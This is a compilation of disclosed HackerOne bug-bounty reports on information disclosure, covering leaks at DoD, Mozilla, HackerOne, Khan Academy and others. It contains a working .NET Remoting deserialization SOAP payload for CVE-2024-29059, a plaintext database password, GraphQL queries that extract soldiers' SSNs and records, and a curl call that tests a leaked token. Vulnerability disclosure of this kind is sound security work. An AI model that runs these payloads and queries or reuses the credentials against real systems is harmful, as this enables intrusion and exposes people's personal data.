# Information Disclosure

_207 reports — High/Critical, disclosed_

### [IBM Aspera HTTP Gateway stores sensitive information in clear text in easily obtainable files which can be read by an unauthenticated user.](https://hackerone.com/reports/3340797)

- **Report ID:** `3340797`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** IBM
- **Reporter:** @jhon1231248e
- **Bounty:** - usd
- **Disclosed:** 2026-04-27T13:29:35.908Z
- **CVE(s):** -

**Summary (team):**

IBM Aspera HTTP Gateway stores sensitive information in clear text was submitted to IBM, analyzed and has been remediated. Thank you to our external researcher jhon1231248e.

---

### [ASLR leak in Mario Kart World through LAN mode](https://hackerone.com/reports/3463719)

- **Report ID:** `3463719`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Nintendo
- **Reporter:** @kinnay
- **Bounty:** - usd
- **Disclosed:** 2026-02-19T00:36:24.466Z
- **CVE(s):** -

**Summary (team):**

-

**Summary (researcher):**

Due to uninitialized data in a network packet, a memory address was leaked in Mario Kart World. This allowed an attacker to bypass ASLR, which is a prerequisite for many kinds of attacks. The vulnerability was fixed in Mario Kart World version 1.5.0.

---

### [Internal logs/info leaked via endpoint {https://203.137.128.240/server-status}](https://hackerone.com/reports/2473173)

- **Report ID:** `2473173`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** pixiv
- **Reporter:** @dexter34
- **Bounty:** - usd
- **Disclosed:** 2026-01-20T00:07:23.232Z
- **CVE(s):** -

**Summary (team):**

Accessing the pixiv server via its direct IP address allows access to the administrative server-status endpoint.

---

### [Exposed wp-config.php file in ███ National Guard website](https://hackerone.com/reports/3328408)

- **Report ID:** `3328408`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jonasdiasrebelo
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:46:34.150Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

Hi, team! 
I found a ██████████ National Guard website with the subdomain/domain `████████`. I know, it is strange they use the azurewebsites.us domain, but apparently it's an official website.
I noticed that some official websites from Department of Defense have versions with the exact same website in azurewebsites.us, however I didn't find the original website with the original domain, but I really think this finding is valid.

████
███████
█████████

A copy of the WordPress config file wp-config.php has been found at `█████████` endpoint. It contains sensitive information, such as MySQL  and various keys.

## Impact

The page provides sensitive information, for example, the database password in plain text.

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Open the link: ██████████

████

Note this detail: 'DB_HOST', '████████'

## Suggested Mitigation/Remediation Actions
Implement access control.

---

### [Exposed wp-config.php file](https://hackerone.com/reports/3252302)

- **Report ID:** `3252302`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jonasdiasrebelo
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:40:39.467Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

Hi team!
A copy of the WordPress config file wp-config.php has been found at █████████ endpoint. It contains sensitive information, such as MySQL and AWS credentials, and various keys.
This domain is in scope, I already had to reports accepted in this domain.

## References

████████

## Impact

The page provides information to any user get a RCE without any problem.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Open the link: 

█████████

And see the file.

## Suggested Mitigation/Remediation Actions
Implement access control.

---

### [[███] .NET Framework ObjRefs Disclosure (CVE-2024-29059)](https://hackerone.com/reports/2471924)

- **Report ID:** `2471924`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @xchopath
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:38:09.001Z
- **CVE(s):** CVE-2024-29059

**Vulnerability Information:**

Microsoft .NET Framework could allow a remote attacker to obtain sensitive information. By sending a specially crafted request, an attacker could exploit this vulnerability to obtain the ObjRef URI and possibly execute arbitrary code on the system.

## Evidences

```
GET /RemoteApplicationMetadata.rem?wsdl HTTP/1.1
Host: ████
Content-Type: text/xml
__RequestVerb: POST
```

██████████

█████████

## References
- <https://code-white.com/blog/leaking-objrefs-to-exploit-http-dotnet-remoting/>

## Impact

CVE-2024-29059 in ASP.NET web applications that might unknowingly leak internal object URIs, which can be used to perform .NET Remoting attacks via HTTP, possibly allowing unauthenticated remote code execution.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2024-29059

## Steps to Reproduce
1. Create a first Request
```
GET /RemoteApplicationMetadata.rem?wsdl HTTP/1.1
Host: ██████████
Content-Type: text/xml
__RequestVerb: POST
```

2. Get the .rem URL

3. Create a Second Request
```
POST /<REM URL>.rem HTTP/1.1
Host: ███████
SOAPAction: ""
Content-Type: text/xml

<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<a1:TextFormattingRunProperties id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
<ForegroundBrush id="ref-3">&#60;ObjectDataProvider MethodName=&#34;AddHeader&#34;
  xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;
  xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;
  xmlns:System=&#34;clr-namespace:System;assembly=mscorlib&#34;
  xmlns:System.Web=&#34;clr-namespace:System.Web;assembly=System.Web&#34;&#62;&#60;ObjectDataProvider.ObjectInstance&#62;&#60;ObjectDataProvider MethodName=&#34;get_Response&#34;&#62;&#60;ObjectDataProvider.ObjectInstance&#62;
  &#60;ObjectDataProvider ObjectType=&#34;{x:Type System.Web:HttpContext}&#34; MethodName=&#34;get_Current&#34; /&#62;
  &#60;/ObjectDataProvider.ObjectInstance&#62;
  &#60;/ObjectDataProvider&#62;
  &#60;/ObjectDataProvider.ObjectInstance&#62;
  &#60;ObjectDataProvider.MethodParameters&#62;
  &#60;System:String&#62;X-Vuln-Test&#60;/System:String&#62;
  &#60;System:String&#62;{{randstr}}&#60;/System:String&#62;
  &#60;/ObjectDataProvider.MethodParameters&#62;
&#60;/ObjectDataProvider&#62;</ForegroundBrush>
</a1:TextFormattingRunProperties>
</SOAP-ENV:Envelope>
```

## Suggested Mitigation/Remediation Actions
Update .NET Framework to latest version.

---

### [Exposure of Sensitive Debug File Containing database dump with passwords in plain text](https://hackerone.com/reports/3019290)

- **Report ID:** `3019290`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jonasdiasrebelo
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:35:55.736Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
A publicly accessible debug file (debug.txt) was discovered on the target web application, exposing sensitive database credentials, including usernames and passwords. This issue poses a severe security risk as it allows unauthorized access to the database, potentially leading to data breaches, privilege escalation, or further exploitation of the system.

Link: ████████

## References

███

## Impact

Data Breach: Confidential data could be extracted or modified.
Privilege Escalation: If the credentials belong to a privileged account, attackers may gain further control over the system.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Open a web browser or use curl/wget to access the following URL:

████

The file contains plaintext user credentials, such as:

```
                    [user] => orgpri
                    [passwd] => 12!@QWasz
                    [dbname] => org_priority
                    [dbtype] => mysql
                    [server] => mysql
```

These credentials could allow an attacker to directly connect to the database and manipulate sensitive data.

## Suggested Mitigation/Remediation Actions
Remove the debug.txt file.

---

### [Secret Access Key of AWS Firehose Disclosure](https://hackerone.com/reports/2914739)

- **Report ID:** `2914739`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @marucube35
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:28:23.884Z
- **CVE(s):** -

**Vulnerability Information:**

The `███████ domain` has the `/error_docs/uat.js` endpoint, which contains the secret access key of AWS Firehose encoded in base64.

The secret access key has permission to put the record.

## Impact

The attacker could repeatedly send massive amounts of data to the Firehose delivery stream, causing:
- Increased costs due to higher data processing charges.
- Potential overloading of downstream systems (e.g., S3, Redshift, or Elasticsearch) if the Firehose delivery stream forwards the data to such services.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to `█████████`.
2. Decode the base64 encoded string found in the file: `███`
3. Use the secret access key and related metadata information to put the record.

The attached image shows that I can put the record.

## Suggested Mitigation/Remediation Actions

---

### [ASBS viewing other soldiers PII/Board/Board Voters/ETC](https://hackerone.com/reports/2954320)

- **Report ID:** `2954320`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @badlifeguard
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:19:23.294Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
An authenticated user, could run GraphQL queries that return sensitive information on other users. 

**Steps to reproduce it**
Please see below.

## References
Using burp suite, an authenticated user is able to do a full introspection against the target. After the introspection, a user can use Burp Suite Repeater to create custom GraphQL Queries based on information they are trying to find. 
CWE-200, CWE-284, CWE-359

## Impact

This would allow an attacker to capture data of soldiers by DoDID, to then look up other soldier data to gather board information, SSN, Clearance information, Branch information.  If a user was able to grab their own information, they could make requests to find out who is included with their current board, review evaluations with a DODID, and look up who is voting on the board, or any board for that matter. 

Additionally, this vulnerability partially impacts all components within the DoD.
Army Personnel: Active, Reserve, National Guard, Civilians, Contractors
Air Force: Active, Civilians, Contractors (unvalidated Reserve, National Guard)
Navy: Reserve (unvalidated Active, National Guard, Civilians, Contractors)
Marines: (unvalidated Active, Reserve, National Guard, Civilians, Contractors)
Coast Guard: (unvalidated Active, Reserve, National Guard, Civilians, Contractors)
Spaceforce: Active (unvalidated Civilians, Contractors)
Dependents: Not impacted unless a valid LDAP entry.

If a legitimate bad actor wanted to, they could once again, create identities of people with SSNs, background check to find peoples location, but more importantly blackmail and intelligence targeting. 
Blackmail board members would be an idea- "Promote me or I release blackmail".
Intelligence targeting-Foreign adversaries would be interested in this information to build leverage on a soldier to blackmail them to giving up sensitive information.

## System Host(s)
██████████,████

## Affected Product(s) and Version(s)
1.09.00.0

## CVE Numbers


## Steps to Reproduce
Using Burp Suite
Login and Authenticate to https://█████████/

Once logged in, Burp suite > proxy > http history will show you the requests. Looking for host: ███. There will be a POST request to: ███████/████████/graphql. In that request body you can manipulate the request. 

With the use of Outlook address book, a user could get anyones DoDID from the Global Address Book, just by adding a contact to their address book and in the contact information, under certificates, it has their DODID appended to their certificate information (Not the vulnerability).

I have not included any screenshots at this moment, more information can be requested. Let me how how I can assist in this finding.

Some of the requests: Any "# " are blocked out for reporting purposes. 
Look up user by DoDID: Only returns Army
{"query":"query {\r\n    userByDodId(dodId: \"#########\") {\r\n        dodId\r\n        fullName\r\n        indivFirstName\r\n        indivLastName\r\n        indivMiddleName\r\n        personGuid\r\n    }\r\n}"}

Look up evaluations by DoDID: Only returns Army
{"query":"query {\r\n    evaluationsByDodId(dodId: \"#########\") {\r\n        aerCrsNm\r\n        apftDt \r\n        apftRsltCd\r\n        bodyFatStdCd\r\n        box1\r\n        box2\r\n        box3\r\n        box4\r\n        classId\r\n        classStandingNr\r\n        classStudentQy\r\n        cmtTx\r\n        docVrsnNr\r\n        dodIdNr\r\n        dualRtrRoleCd\r\n        dutyDescTx\r\n        dutyStationNm\r\n        evalId\r\n        evalPdEndDt \r\n        evalPdStDt \r\n        evalRecModDtm \r\n        evalRptGrpCd\r\n        evalRptRsnCd\r\n        evalRptRsnCdDesc\r\n        evalRptTypCd\r\n        evaluationGroupType\r\n        gpa\r\n        irCmtTx\r\n        irDutyTitle\r\n        irRankAb\r\n        jpmeIndCd\r\n        labelPercentage\r\n        manualUpload\r\n        milEdLvlCd\r\n        mosDsgTx\r\n        mpcCd\r\n        oerRefCd\r\n        physMeasHgtIn\r\n        physMeasWgtLb\r\n        rankAb\r\n        ratedFirstNm\r\n        ratedFullName\r\n        ratedLastNm\r\n        ratedMiddleNm\r\n        ratedMonths\r\n        ratedSuffix\r\n        raterDutyTitleTx\r\n        raterEvalRatedQy\r\n        raterFirstNm\r\n        raterFullName\r\n        raterLabel\r\n        raterLabelDesc\r\n        raterLastNm\r\n        raterMiddleNm\r\n        raterOffRatedQy\r\n        raterPerformanceComments\r\n        raterPotentialComments\r\n        raterRankAb\r\n        raterRankRatedQy\r\n        raterSuffix\r\n        reasonDescTx\r\n        rsDutyTitleTx\r\n        rsTotalArmyCompCd\r\n        seniorRaterDutyTitleTx\r\n        seniorRaterEvalRatedQy\r\n        seniorRaterFirstNm\r\n        seniorRaterFullName\r\n        seniorRaterLabel\r\n        seniorRaterLabelDesc\r\n        seniorRaterLastNm\r\n        seniorRaterMiddleNm\r\n        seniorRaterOffBasBrCd\r\n        seniorRaterOffRatedQy\r\n        seniorRaterPotentialComments\r\n        seniorRaterRankAb\r\n        seniorRaterRankRatedQy\r\n        seniorRaterSuffix\r\n        sharpStmtCd\r\n        srDutyTitleTx\r\n        srRankAb\r\n        stuIdLocCd\r\n        unitDsgTx\r\n    }\r\n}"}

Look up candidates per board GUID:
{"query":"query {\r\n    candidatesForBoard(boardGuid: \"#######-5881-4E16-9C6C-4BC53014E8CB\") {\r\n        basdDt \r\n        birthDt\r\n        boardCandidateGuid\r\n        cmsndOffBasicBrCd\r\n        cmsndOffBasicBrDesc\r\n        cmsndOffControlBrCd\r\n        cmsndOffDetailBrCd\r\n        dodId\r\n        dorDt\r\n        enlMosCd\r\n        enlPromMosId\r\n        indivFirstName\r\n        indivLastName\r\n        indivMiddleName\r\n        indivName\r\n        indivSuffixName\r\n        ipermsSyncDt\r\n        milRankCd\r\n        milRankDesc\r\n        milSvcCompoCd\r\n        milSvcCompoDesc\r\n        mpcCd\r\n        mpcDesc\r\n        orgSrcCd\r\n        primaryJobCode\r\n        promConsidRecmdCd\r\n        promotableStatus\r\n        recCreateDt\r\n        recCreateSource {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            personGuid\r\n        }\r\n        recDeleteInd\r\n        recUpdateDt\r\n        recUpdateSource {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            personGuid\r\n        }\r\n        secondaryJobCode\r\n        warrOffMosCd\r\n    }\r\n}"}

Look up board voters per board event GUID:
{"query":"query {\r\n    boardEventVoters(boardEventGuid: \"#######-5BF0-46C2-8C32-EDD4C89758F8\") {\r\n        boardEventGuid\r\n        boardEventVoterGuid\r\n        boardTeamMemberGuid\r\n        estTimeToFinish\r\n        numCandidatesDistributed\r\n        numCandidatesVoted\r\n        numInquiries # Long scalar\r\n        percentCandidatesVoted\r\n        recCreateDt \r\n        recCreateSource {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            personGuid\r\n        }\r\n        recDeleteInd\r\n        recUpdateDt \r\n        recUpdateSource {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            personGuid\r\n        }\r\n        voter {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            lastCheckedDt \r\n            personGuid\r\n            photo\r\n        }\r\n    }\r\n}"}


Look up LDAP person by DoDID: (Reference the impact of DoDIDs from above. Seems like anyone with an active directory account in the DOD)
{"query":"query {\r\n    findLdapPersonByDodId(dodId: \"#########\") {\r\n        accountType\r\n        babr\r\n        babrDesc\r\n        branchOfService\r\n        cmfDesc\r\n        cn\r\n        dymose\r\n        ediPi\r\n        emailServiceClass\r\n        enlistedPmos\r\n        fascn\r\n        givenName\r\n        macom\r\n        mail\r\n        middleName\r\n        occupationCode\r\n        officerPaoc\r\n        officerPaocDesc\r\n        personCategory\r\n        personCondType\r\n        personNickname\r\n        personaDisplayName\r\n        personaTitle\r\n        personaUid\r\n        personaUserName\r\n        ptc\r\n        rank\r\n        sn\r\n        ssn\r\n        status\r\n        uic\r\n        uid\r\n        userPrincipalName\r\n    }\r\n}"}

## Suggested Mitigation/Remediation Actions
Disable introspection on GraphQL, this will make it harder for an attacker to gain information on how the API works and reduces the risk of unwanted information disclosure.
Review the API's schema to make sure that it does not expose unintended fields to the public.
Make sure that suggestions are disabled. This prevents attackers from being able to use Clairvoyance or similar tools to glean information about the underlying schema. If you cannot disable suggestions directly in Apollo. See this https://github.com/apollographql/apollo-server/issues/3919#issuecomment-836503305 thread for a workaround.

Reference links:
https://portswigger.net/web-security/graphql#preventing-graphql-attacks
https://www.apollographql.com/blog/securing-your-graphql-api-from-malicious-queries

---

### [337k users and 1 employee leaked credentials](https://hackerone.com/reports/3250691)

- **Report ID:** `3250691`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Khan Academy
- **Reporter:** @meowsint
- **Bounty:** - usd
- **Disclosed:** 2025-09-10T14:44:42.496Z
- **CVE(s):** -

**Vulnerability Information:**

Hey Khan Academy,

So there's this website called "https://leakradar.io" while surfing this site i came across your website "https://www.khanacademy.org/" i found out there was huge amount of accounts were leaked there, one of them was a employee account which is valid.

url: https://www.khanacademy.org/login
mail: ███████
pass: ███

These are the credentials you can try, other than this there was 337.7k users account and some were added today to that website.

Also we can request the website for removal so if you want i can request for you to that site to remove all Khan Academy credentials.

I would like to suggest a feature "New device/location otp" so even if there's a leaked credentials an attacker would need a additional otp it will safe customers from being hacked and they will know someone is trying to login into their account so they will immediately change their passwords.

Kind regards
███

## Impact

Users account are being leaked which can leak Khan Academy's customers sensitive information

---

### [Information Disclosure at : https://curl.se/.mailmap](https://hackerone.com/reports/2853023)

- **Report ID:** `2853023`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** curl
- **Reporter:** @haithamzakaria
- **Bounty:** - usd
- **Disclosed:** 2025-07-07T10:18:15.686Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
=================
During a security assessment, it was discovered that email addresses were exposed in a publicly accessible location. The data was retrieved using standard tools, such as curl, without requiring authentication or special permissions. This raises a concern regarding the confidentiality of sensitive user information.
## Steps To Reproduce:
==================
 The following email addresses were disclosed:   
at : https://curl.se/.mailmap
1. Andy Alt: arch_stanton5995@protonmail.com
2. Ali Khodkar: 129806877+Alikhodkar@users.noreply.github.com


## Supporting Material/References:
=============
go to : https://curl.se/.mailmap
now add you payload

## Impact

Exposing email addresses can lead to phishing attacks, spam, or social engineering attacks targeting the affected individuals.

If these emails are linked to privileged accounts (e.g., administrative roles or GitHub contributors), this exposure increases the risk of further exploitation, such as impersonation or unauthorized account access.

---

### [Git repository found](https://hackerone.com/reports/2915426)

- **Report ID:** `2915426`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** curl
- **Reporter:** @tefa_
- **Bounty:** - usd
- **Disclosed:** 2025-07-07T10:16:58.720Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello team , 
When i research I found domain vuln to downliad git repository and i will explain that.

## Steps To Reproduce:

1. Add DotGit extention on your browser
2. Now try to access to that domain https://curl.dev/
3. You will show that extention is alert and can download that bucket.

## Impact

## Summary:
The exposure of the /.git directory can lead to unauthorized access to sensitive information, such as source code, configuration files, and potentially secrets or credentials stored in the repository.

---

### [Netlify Authentication Token Exposed in Public Mozilla CI Logs](https://hackerone.com/reports/2915647)

- **Report ID:** `2915647`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Mozilla
- **Reporter:** @samirsec0x01
- **Bounty:** 1500 usd
- **Disclosed:** 2025-05-13T09:35:01.798Z
- **CVE(s):** -

**Vulnerability Information:**

A critical vulnerability was discovered involving the exposure of a Netlify authentication token within publicly accessible logs. This token provided full access to the `Mozilla IT Web SRE` Netlify account, bypassing all restrictions. The token’s permissions encompassed roles such as Owner, Developer, Billing Admin, Reviewer, Publisher, and Content Editor, granting complete control over site management, deployments, billing, and content configurations. This exposed API key posed significant security risks, enabling unauthorized users to manipulate the account and its associated assets freely.

---

### **Key Information:**
- **Exposed Token:** `███`
- **Source of Exposure:**
  - **Public URL:** [Mozilla CI Logs](https://firefox-ci-tc.services.mozilla.com/tasks/d5NRF8FdQamV9XdPO_mTBQ/runs/0/logs/public/logs/live.log)
  - **File:** `live.log`
- **API Used for Verification:** [Netlify API Documentation](https://open-api.netlify.com/)
- **Website at Risk:** `https://crash-pings.mozilla.org`
- **Account at Risk:** `Mozilla IT Web SRE`

---

### **Steps to Reproduce:**

1. **Access Public Log:**
   - Open the following URL in a browser: [Mozilla CI Logs](https://firefox-ci-tc.services.mozilla.com/tasks/d5NRF8FdQamV9XdPO_mTBQ/runs/0/logs/public/logs/live.log).

2. **Locate the Exposed Token:**
   - Search for the keyword `auth:` in the log file.
   - Extract the Netlify token (e.g., `███`).

3. **Verify Token Validity:**
   - Use the token to query the Netlify API. For example:

```bash
curl -X GET https://api.netlify.com/api/v1/accounts -H "Authorization: Bearer ████" -s | jq
```

   - Observe the response containing sensitive information about the Netlify account's sites.

```json
[
  {
    "name": "Mozilla IT Web SRE",
    "slug": "mozilla-it",
    "role": "Developer",
    ...
    ...
    "selected_access_site_ids": [
      "5a05c659-aa54-4184-bdbe-7faa4dd497b5"
    ],
    "billing_name": "it-sre",
    "billing_email": "it-sre@mozilla.com",
    "billing_details": null,
    ...
    ...
    "roles_allowed": [
      "Owner",
      "Developer",
      "Billing Admin",
      "Reviewer",
      "Publisher",
      "Content Editor"
    ],
    "created_at": "2019-06-26T13:57:19.242Z",
    "updated_at": "2024-07-08T18:56:21.541Z",
    "has_site_password": false,
    "site_sso_login": false,
    "site_sso_login_context": "all",
    "site_jwt_secret": null,
    "saml_config": {
      "idp_entity_id": "urn:auth.mozilla.auth0.com",
      "idp_sso_target_url": "https://auth.mozilla.auth0.com/samlp/hj3jYIhcrgvPWTpnFoHWLPx57t6KKqhA",
      "idp_slo_target_url": "https://auth.mozilla.auth0.com/samlp/hj3jYIhcrgvPWTpnFoHWLPx57t6KKqhA/logout",
      "idp_cert_fingerprint": "2F:C4:72:FC:FE:1C:69:A6:6E:8B:A7:FA:72:AA:3D:08:B0:A0:6A:F8"
    },
    "saml_session_expiration": 604800,
    "deploy_notifications_per_repo": true,
    "payments_gateway_name": "zuora_production",
    "lifecycle_state": "active",
    "lifecycle_state_reason": null,
    "weeks_past_due": null,
    "days_until_disabled": null,
    "current_billing_period_start": "2024-12-26T00:00:00.000-08:00",
    "next_billing_period_start": "2025-01-26T00:00:00.000-08:00",
    "current_usage_period_start": "2024-12-01T00:00:00.000-08:00",
    "next_usage_period_start": "2025-01-01T00:00:00.000-08:00",
    ...
    ...
    "type_name": "Enterprise",
    "type_id": "58f792a3d6865d698b6879bd",
    "type_slug": "enterprise",
    "monthly_seats_addon_dollar_price": "0.0",
    "owner_ids": [
      "60be48126deb9594c56ad4a0",
      "60c285a4fa8ef00f41b7a171",
      "60eda0538f4cf6540569b4b5",
      "62548540b51a811561330ed7",
      "62c5e063fe09d502f8dc2519",
      "62f22a000c27a1187e2be65b",
      "62ffe60780a012285fb7d36f",
      "63b429858592e6679549e622",
      "650deaef51dc692b41f8b3f2",
      "658210e2646ba26e2d050ff4"
    ],
    "saml_enabled": true,
    "org_saml_enabled": false,
    "org_mfa_enabled": false,
    "default": false,
    "cancellable": false,
    "has_builds": true,
    "enforce_saml": "enforced_strict",
    "team_logo_url": null,
    "can_start_pro_trial": false,
    "on_pro_trial": false,
    "can_start_enterprise_trial": false,
    "on_enterprise_trial": false,
    "security_contacts": [],
    "gitlab_self_hosted_config": null,
    "github_enterprise_config": null,
    "bitbucket_self_hosted_config": null
  }
]
```

4. **Confirm Full Access:**
   - Perform other API requests, such as deploying, deleting, or modifying sites.
   - For example, access sensitive logs, environment variables, or site configurations.
   - You can test all endpoints in Netlify api docs: https://open-api.netlify.com

---

## **Proof of Concept (PoC):**
I have created a POC video:
███

---

### **Recommendations:**

1. **Revoke the Token:**
   - Revoke the exposed token immediately and notify all affected stakeholders.

2. **Audit Logging Practices:**
   - Review all CI/CD pipelines to ensure sensitive data (e.g., authentication tokens) are masked.

3. **Enhance Token Security:**
   - Implement OAuth scopes or IP whitelisting to restrict token usage.
   - Monitor for suspicious API usage to detect possible exploitation.

---

## **Thank You!**
I appreciate the opportunity to report this critical issue and assist in securing your systems.

---

## Impact

The leaked authentication token provides **full access** to the Netlify account, leading to the following risks:

	1.	**Financial Theft:**
	-	Change the `billing_email` to divert all payouts to an attacker-controlled account.
	2.	**Site Compromise:**
	-	Modify, delete, or deploy malicious content on the associated site (https://crash-pings.mozilla.org).
	3.	**Data Exposure:**
	-	Access environment variables, logs, and other sensitive configuration data.
	4.	**Reputation Damage:**
	-	Use the compromised account to host malicious content or phishing attacks.
	5.	**Permanent Loss of Control:**
	-	Delete all sites and configurations, causing irreversible damage.

---

### [Possible Sensitive Session Information Leak in Active Storage](https://hackerone.com/reports/3082917)

- **Report ID:** `3082917`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Internet Bug Bounty
- **Reporter:** @tyage
- **Bounty:** 4323 usd
- **Disclosed:** 2025-04-27T22:55:36.012Z
- **CVE(s):** -

**Vulnerability Information:**

Original report: https://hackerone.com/reports/2140554
Advisory: https://github.com/rails/rails/security/advisories/GHSA-8h22-8cf7-hq6g

## Impact

Active Storage, when serving files (blobs), incorrectly sends the Set-Cookie header containing the user's session cookie along with a Cache-Control: public header.
Some certain caching proxies may cache this response, including the Set-Cookie header.
This allows unrelated users accessing the cached content to obtain the original user's session cookie.

**Summary (team):**

Possible Sensitive Session Information Leak in Active Storage

There is a possible sensitive session information leak in Active Storage. By
default, Active Storage sends a Set-Cookie header along with the user's
session cookie when serving blobs. It also sets Cache-Control to public.
Certain proxies may cache the Set-Cookie, leading to an information leak.

This vulnerability has been assigned the CVE identifier CVE-2024-26144.

Versions Affected: >= 5.2.0, < 7.1.0
Not affected: < 5.2.0, > 7.1.0
Fixed Versions: 7.0.8.1, 6.1.7.7

---

### [The /reports/:id.json endpoint discloses potentially sensitive user attributes when reporter summary is present](https://hackerone.com/reports/3000510)

- **Report ID:** `3000510`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @avinash_
- **Bounty:** 25000 usd
- **Disclosed:** 2025-04-01T18:23:00.654Z
- **CVE(s):** -

**Vulnerability Information:**

Hi

The.json endpoint of any disclosed report is leaking reporter's email, OTP backup codes, reporter's phone number, "graphql_secret_token", tshirt size all the reporter account's internal details etc. 

```
 GET /reports/█████.json HTTP/2
Host: hackerone.com
````

* I was checking Hackerone's disclosed report ██████████ and suddenly during check found .json point is leaking too much data of reporter ```████``` . I immediately reported it to you.

█████



* PoC:- Leakage of data of reporter

█████
█████





## Impact

Reporter H1 account private data disclosed

---

### [Wordpress users Disclosure](https://hackerone.com/reports/2981756)

- **Report ID:** `2981756`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Autodesk
- **Reporter:** @karimtantawy
- **Bounty:** - usd
- **Disclosed:** 2025-02-12T17:00:44.713Z
- **CVE(s):** -

**Vulnerability Information:**

we can see all the WordPress users/author with some of their information. Which can even be Personal information of employees/author. The file author-sitemap.xml at:https://www.payapps.com/author-sitemap.xml is enabled and this give the attacker many users names and emails like:

{F4036174}

## Impact

Malicious people could collect the usernames disclosed (and the admin user) and be focused throughout BF attack (as the usernames are now known), making it less harder to penetrate your systems.

---

### [Public google drive link Exposes Military Orders Containing PII (Name, SSN etc..) and Operational Details](https://hackerone.com/reports/2926447)

- **Report ID:** `2926447`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @entropydrifter
- **Bounty:** - usd
- **Disclosed:** 2025-01-24T14:50:26.425Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
I found google drive link `https://drive.google.com/drive/folders/█████████`  at `https://████████.aspx?Mode=ReadOnly&Id=90dd0d3b-0ed1-e76b-128f-11ebc799ba55` contains pdfs at '/████ Internal/Orders' that discloses the following PII:

Full Name: ███████
Social Security Number (SSN): ███████
Home Address: ████, ██████
Marital Status: Married, 3 dependents (M03 in January 2021 orders; S00 in earlier orders)
Security Clearance Level: ███

## How to reproduce 

1. Navigate to `https://██████.aspx?Mode=ReadOnly&Id=90dd0d3b-0ed1-e76b-128f-11ebc799ba55`.
2. Below the page you will find `https://drive.google.com/drive/folders/█████████`.
3. Go to `https://drive.google.com/drive/folders/███████`.
4. Open folder named `███████ Internal`.
5.Navigate to folder named `Orders`.
6. You will find the pdfs that discloses PII data as shown below in screen shots.

██████████

██████

## Impact

1. Privacy Violation: Exposes PII of personnel, violating privacy laws such as the U.S. Privacy Act of 1974.
2. Identity Theft and Fraud: Information like SSNs and home addresses can be used for malicious purposes.

## System Host(s)
██████

## Affected Product(s) and Version(s)
https://█████████.aspx?Mode=ReadOnly&Id=90dd0d3b-0ed1-e76b-128f-11ebc799ba55

## CVE Numbers


## Steps to Reproduce
1. Navigate to `https://██████.aspx?Mode=ReadOnly&Id=90dd0d3b-0ed1-e76b-128f-11ebc799ba55`.
2. Below the page you will find `https://drive.google.com/drive/folders/█████`.
3. Go to `https://drive.google.com/drive/folders/███`.
4. Open folder named `███ Internal`.
5.Navigate to folder named `Orders`.
6. You will find the pdfs that discloses PII data as shown below in screen shots.

█████

██████

## Suggested Mitigation/Remediation Actions
